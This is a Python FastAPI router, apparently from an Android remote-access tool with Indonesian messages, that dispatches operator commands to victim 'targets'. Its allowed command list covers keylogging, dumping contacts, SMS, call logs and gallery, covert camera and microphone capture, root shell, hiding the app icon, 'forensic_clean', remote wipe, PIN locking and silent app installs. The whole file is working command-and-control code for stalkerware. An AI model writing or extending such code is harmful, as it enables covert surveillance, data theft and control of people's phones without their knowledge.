"""API kontrol remote."""
from __future__ import annotations

import asyncio
import time

from fastapi import APIRouter, Depends, HTTPException

from . import db, security
from .ws import hub

router = APIRouter(prefix="/api/control", dependencies=[Depends(security.require_operator)])

ALLOWED = {
    "locate_once", "locate_start", "locate_stop",
    "screen_start", "screen_stop", "screen_shot",
    "tap", "swipe", "key", "text", "shell", "root_shell",
    "cam_front", "cam_back", "cam_stop",
    "mic_start", "mic_stop", "speaker_play",
    "wallpaper_set", "media_push", "lock_screen", "lock_pin",
    "dump_contacts", "dump_sms", "dump_calls", "dump_gallery",
    "dump_notif", "dump_net", "dump_keylog", "dump_apps",
    "notif_start", "notif_stop", "keylog_start", "keylog_stop",
    "hide_icon", "show_icon", "ping", "info", "forensic_clean",
    "brightness", "volume", "vibrate", "toast", "open_url",
    "delay_mode", "kill_self", "reconnect",
    "clipboard", "wifi_set", "data_set", "airplane",
    "screen_on", "screen_off", "reboot", "reboot_recovery", "power_off", "wipe",
    "dial", "call", "sms_send", "app_uninstall", "app_install", "write_settings",
}


@router.post("/{target_id}/{ctype}")
async def send(target_id: str, ctype: str, body: dict | None = None) -> dict:
    if ctype not in ALLOWED:
        raise HTTPException(400, f"perintah '{ctype}' tidak dikenal")
    if db.one("SELECT id FROM targets WHERE id=?", (target_id,)) is None:
        raise HTTPException(404, "Target tidak ditemukan")
    online = hub.is_online(target_id)
    cid = await hub.command(target_id, ctype, body or {})
    db.audit("cmd", f"{target_id} :: {ctype}")
    return {"ok": True, "id": cid, "queued": not online}


@router.get("/{target_id}/queue")
async def queue(target_id: str) -> dict:
    rows = db.q(
        "SELECT * FROM commands WHERE target_id=? ORDER BY created DESC LIMIT 80", (target_id,))
    return {"commands": [dict(r) for r in rows]}


@router.post("/{target_id}/flush")
async def flush(target_id: str) -> dict:
    await hub.flush_queue(target_id)
    return {"ok": True}


@router.get("/{target_id}/wait/{cid}")
async def wait(target_id: str, cid: str, timeout: float = 25.0) -> dict:
    deadline = time.time() + min(timeout, 60.0)
    while time.time() < deadline:
        row = db.one("SELECT status,result FROM commands WHERE id=? AND target_id=?",
                     (cid, target_id))
        if row and row["status"] in {"done", "error", "timeout"}:
            return {"ok": row["status"] == "done", "status": row["status"],
                    "result": row["result"]}
        await asyncio.sleep(0.35)
    return {"ok": False, "status": "pending", "result": None}
